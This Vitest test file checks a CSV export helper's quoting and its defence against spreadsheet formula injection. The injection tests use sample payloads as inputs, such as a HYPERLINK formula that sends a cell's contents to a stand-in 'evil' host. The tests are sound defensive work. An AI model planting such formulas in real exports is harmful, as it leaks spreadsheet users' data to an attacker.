import { describe, it, expect } from 'vitest';
import { escapeCSV, rowsToCSV } from './csv-export';

// ── CSV formula injection (faille N11) ──────────────────────────────────
// Excel/Sheets execute any cell starting with = + - @ TAB CR as a formula.
// escapeCSV must neutralise those by prefixing a single quote.
describe('escapeCSV — formula injection (N11)', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'prefixes a quote when the value starts with %j',
    (lead) => {
      const out = escapeCSV(`${lead}HYPERLINK("http://evil")`);
      // leading apostrophe neutralises the formula
      expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
      expect(out).toContain("'" + lead);
    }
  );

  it('neutralises a classic exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil/?leak="&A1)';
    const out = escapeCSV(payload);
    // must NOT begin with `=` (would execute); apostrophe-prefixed + quoted
    expect(out.startsWith('=')).toBe(false);
    expect(out).toContain("'=HYPERLINK");
  });

  it('does not prefix benign values', () => {
    expect(escapeCSV('Acheter du lait')).toBe('Acheter du lait');
    expect(escapeCSV('Réviser maths')).toBe('Réviser maths');
  });
});

// ── RFC-4180-ish quoting ────────────────────────────────────────────────
describe('escapeCSV — quoting', () => {
  it('quotes values containing a comma', () => {
    expect(escapeCSV('a,b')).toBe('"a,b"');
  });
  it('quotes and doubles internal double-quotes', () => {
    expect(escapeCSV('say "hi"')).toBe('"say ""hi"""');
  });
  it('quotes values containing newlines', () => {
    expect(escapeCSV('line1\nline2')).toBe('"line1\nline2"');
  });
  it('maps null/undefined to empty string', () => {
    expect(escapeCSV(null)).toBe('');
    expect(escapeCSV(undefined)).toBe('');
  });
  it('stringifies numbers/booleans', () => {
    expect(escapeCSV(42)).toBe('42');
    expect(escapeCSV(false)).toBe('false');
  });
});

describe('rowsToCSV', () => {
  it('prepends a UTF-8 BOM and joins header + rows', () => {
    const csv = rowsToCSV(['A', 'B'], [['1', '2'], ['3', '4']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff); // BOM
    expect(csv).toBe('﻿A,B\n1,2\n3,4');
  });

  it('escapes both headers and cells', () => {
    const csv = rowsToCSV(['Na,me'], [['=cmd']]);
    expect(csv).toContain('"Na,me"');
    expect(csv).toContain("'=cmd");
  });
});
